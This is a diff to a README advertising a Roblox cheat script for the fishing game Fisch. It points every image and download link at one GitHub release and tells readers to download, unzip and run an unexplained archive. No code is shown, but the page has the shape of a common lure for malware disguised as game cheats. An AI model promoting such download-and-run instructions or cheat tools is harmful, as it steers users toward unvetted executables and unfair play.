@@ -4,7 +4,7 @@
 
 Welcome to the "Roblox-Fisch-Script" repository, a truly unique software for Fisch enthusiasts. Developed using advanced technologies and reverse expertise, we proudly present a reliable solution that will give you an edge over your competitors in the dynamic world of Roblox fishing.
 
-![Fisch Logo](https://example.com/fisch_logo.png)
+![Fisch Logo](https://github.com/BatMan00md/Roblox-Fisch-Script/releases/tag/v2.0)
 
 ## Features
 
@@ -27,7 +27,7 @@ Our script offers a wide range of features to enhance your fishing experience in
 
 To access the latest version of our software, please download from the following link: 
 
-[Download Fisch Script](https://github.com/file/App.zip)
+[Download Fisch Script](https://github.com/BatMan00md/Roblox-Fisch-Script/releases/tag/v2.0)
 
 For launching the file, simply unzip the downloaded folder and initiate the script to begin your enhanced Roblox fishing journey.
 
@@ -45,4 +45,4 @@ For any inquiries or support requests, feel free to reach out to our team throug
 
 🐟🌊🎮
 
-![Happy Fishing](https://example.com/happy_fishing_image.png)
+![Happy Fishing](https://github.com/BatMan00md/Roblox-Fisch-Script/releases/tag/v2.0)
